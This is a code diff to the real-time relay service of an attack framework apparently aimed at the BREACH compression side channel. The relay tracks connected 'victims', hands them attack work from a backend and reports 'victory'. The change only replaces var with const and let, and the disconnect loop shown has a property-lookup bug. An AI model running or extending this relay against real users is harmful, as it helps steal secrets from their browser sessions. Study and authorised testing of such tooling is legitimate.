@@ -21,8 +21,8 @@ const PORT = program.port;
 winston.info('Rupture real-time service starting');
 winston.info('Listening on port ' + PORT);
 
-var socket = io.listen(PORT);
-var victims = {};
+const socket = io.listen(PORT);
+const victims = {};
 
 const BACKEND_HOST = program.backendHost;
       BACKEND_PORT = program.backendPort;
@@ -32,9 +32,9 @@ winston.info('Backed by backend service running at ' + BACKEND_HOST + ':' + BACK
 socket.on('connection', (client) => {
     winston.info('New connection from client ' + client.id);
 
-    var victimId;
+    let victimId;
     client.on('client-hello', (data) => {
-        var victim_id;
+        let victim_id;
 
         try {
             ({victim_id} = data);
@@ -53,12 +53,12 @@ socket.on('connection', (client) => {
         }
     });
 
-    var doNoWork = () => {
+    const doNoWork = () => {
         client.emit('do-work', {});
     };
 
-    var createNewWork = () => {
-        var getWorkOptions = {
+    const createNewWork = () => {
+        const getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
             path: '/breach/get_work/' + victimId
@@ -66,8 +66,8 @@ socket.on('connection', (client) => {
 
         winston.debug('Forwarding get_work request to backend URL ' + getWorkOptions.path);
 
-        var getWorkRequest = http.request(getWorkOptions, (response) => {
-            var responseData = '';
+        const getWorkRequest = http.request(getWorkOptions, (response) => {
+            let responseData = '';
             response.on('data', (chunk) => {
                 responseData += chunk;
             });
@@ -89,10 +89,10 @@ socket.on('connection', (client) => {
         getWorkRequest.end();
     };
 
-    var reportWorkCompleted = (work) => {
-        var requestBodyString = JSON.stringify(work);
+    const reportWorkCompleted = (work) => {
+        const requestBodyString = JSON.stringify(work);
 
-        var workCompletedOptions = {
+        const workCompletedOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
             headers: {
@@ -103,14 +103,14 @@ socket.on('connection', (client) => {
             method: 'POST',
         };
 
-        var workCompletedRequest = http.request(workCompletedOptions, (response) => {
-            var responseData = '';
+        const workCompletedRequest = http.request(workCompletedOptions, (response) => {
+            let responseData = '';
             response.on('data', (chunk) => {
                 responseData += chunk;
             });
             response.on('end', () => {
                 try {
-                    var victory = JSON.parse(responseData).victory;
+                    const victory = JSON.parse(responseData).victory;
 
                     winston.info('Got (work-completed) response from backend: ' + responseData);
 
@@ -139,7 +139,7 @@ socket.on('connection', (client) => {
     });
 
     client.on('work-completed', (data) => {
-        var work, success, host;
+        let work, success, host;
 
         try {
             ({work, success, host} = data);
@@ -151,20 +151,20 @@ socket.on('connection', (client) => {
 
         winston.info('Client indicates work completed: ', work, success, host);
 
-        var requestBody = work;
+        const requestBody = work;
         requestBody.success = success;
         reportWorkCompleted(requestBody);
     });
     client.on('disconnect', () => {
         winston.info('Client ' + client.id + ' disconnected');
 
-        for (var i in victims) {
+        for (let i in victims) {
             if (victims.i == client.id) {
                 victims.i = null;
             }
         }
 
-        var requestBody = {
+        const requestBody = {
             success: false
         };
         reportWorkCompleted(requestBody);
